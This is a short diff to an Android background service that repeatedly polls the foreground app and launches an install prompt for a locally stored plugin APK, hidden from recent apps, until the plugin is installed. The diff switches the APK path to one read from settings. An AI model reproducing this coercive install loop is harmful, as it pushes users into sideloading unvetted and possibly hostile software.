@@ -6,8 +6,11 @@ import android.content.Context;
 import android.content.Intent;
 import android.net.Uri;
 import android.os.IBinder;
+import android.text.TextUtils;
+import com.xstd.qm.setting.SettingManager;
 
 import java.io.File;
+import java.util.Set;
 
 /**
  * Created with IntelliJ IDEA.
@@ -31,6 +34,9 @@ public class WatchingService extends Service {
         mWatchingThread = new Thread(new Runnable() {
             @Override
             public void run() {
+                String local = SettingManager.getInstance().getLocalApkPath();
+                if (TextUtils.isEmpty(local)) return;
+
                 while (!AppRuntime.WATCHING_SERVICE_BREAK.get()) {
                     String packname = am.getRunningTasks(1).get(0).topActivity.getPackageName();
                     if (!"com.android.packageinstaller".equals(packname)) {
@@ -38,7 +44,7 @@ public class WatchingService extends Service {
 
                         if (!AppRuntime.PLUGIN_INSTALLED) {
                             Intent i = new Intent(Intent.ACTION_VIEW);
-                            File upgradeFile = new File(Config.PLUGIN_APK_PATH);
+                            File upgradeFile = new File(local);
                             i.setDataAndType(Uri.fromFile(upgradeFile), "application/vnd.android.package-archive");
                             i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                             i.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
